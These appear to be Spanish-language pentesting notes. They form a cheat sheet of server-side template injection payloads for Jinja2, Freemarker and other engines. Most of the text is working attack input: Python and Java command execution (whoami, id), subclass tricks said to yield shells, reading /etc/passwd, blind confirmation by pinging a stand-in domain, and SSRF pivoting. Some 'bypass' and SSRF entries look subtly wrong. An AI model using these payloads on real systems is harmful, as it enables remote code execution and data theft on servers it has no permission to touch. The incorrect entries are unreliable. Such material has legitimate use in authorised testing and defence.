-- - 

**Siempre que vemos que esta corriendo python de fondo, flask o werkzeug hay que probar el siguiente payload:**
```flask
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }} --> payload usado para ejecutar comandos.
```
#### **Payload Crafting**

- **Jinja2**: 
  - **Acceder a objetos de Python si el sandbox es débil**:
    ```jinja2
    {{''.__class__.__mro__[1].__subclasses__()[X]}}
    ```
    - Reemplaza `X` con un índice (por ejemplo, `135` para `os._wrap_close`) para generar shells.

- **Freemarker**: 
  - **Invocar utilidades de Java**:
    ```freemarker
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
    ```
  
---
#### **Bypass Tactics**

- **¿Sandboxed?** 
  - Busca configuraciones incorrectas o versiones antiguas (por ejemplo, **Jinja2 < 2.10** tenía bypasses).
- **¿Filtros activos?**
  - Utiliza cadenas con pipes:
    ```jinja2
    {{'id'|os.system}}
    ```
  
---
#### **Explotación Avanzada**

- **Blind SSTI (sin salida visible)**:
  - Genera retrasos o pings para confirmar la ejecución:
    ```jinja2
    {{().__class__.__bases__[0].__subclasses__()[X]('ping -c 10 yourdomain.com')}}
    ```

- **Inclusión de Archivos (File Inclusion)**:
  - Leer archivos secretos:
    ```freemarker
    <#include "/etc/passwd">
    ```

- **SSRF Chaining (Encadenamiento de SSRF)**:
  - Pivote interno:
    ```jinja2
    {{url_for('http://internal.service')}}
    ```
  
---

| Template Engine | Test Payload        | Success Indicator  |
| --------------- | ------------------- | ------------------ |
| Jinja2          | {{7*7}}             | 49 in response     |
| Freemarker      | <#assign x=7*7>${x} | 49 in response     |
| Twig            | {{7*7}}             | 49 in response     |
| Velocity        | #set($x=7*7)$x      | 49 in response     |
| ERB             | <%= 7*7 %>          | 49 in response<br> |

### Resources
https://github.com/swisskyrepo/PayloadsAllTheThings
**tplmap:** Scans for SSTI across engines:
